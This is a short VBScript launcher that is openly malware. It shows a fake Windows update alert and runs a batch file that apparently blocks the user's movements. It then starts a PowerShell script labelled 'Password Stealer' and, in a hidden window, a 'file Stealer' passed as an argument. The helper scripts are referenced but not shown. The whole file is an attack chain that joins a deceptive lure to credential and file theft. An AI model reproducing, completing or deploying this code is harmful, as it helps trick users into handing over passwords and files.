
''' Loads dependancys
DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )

''' Alert Box
z=MsgBox("Your Windows PC requires an update... ", 0+64, "Windows Alert!!!")




''' prevents movments
CreateObject("Wscript.Shell").Run """Disable.bat""", 1, True

''' Loads Password Stealer
Set objShell = CreateObject( "Wscript.shell" )
''' objShell.run("powershell -noexit -file c:\fso\Get-Password.ps1")
CreateObject("Wscript.Shell").Run """Get-Password.ps1""", 1, True

''' enable movments
CreateObject("Wscript.Shell").Run """Enable.bat""", 1, True




''' Loads file Stealer
CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
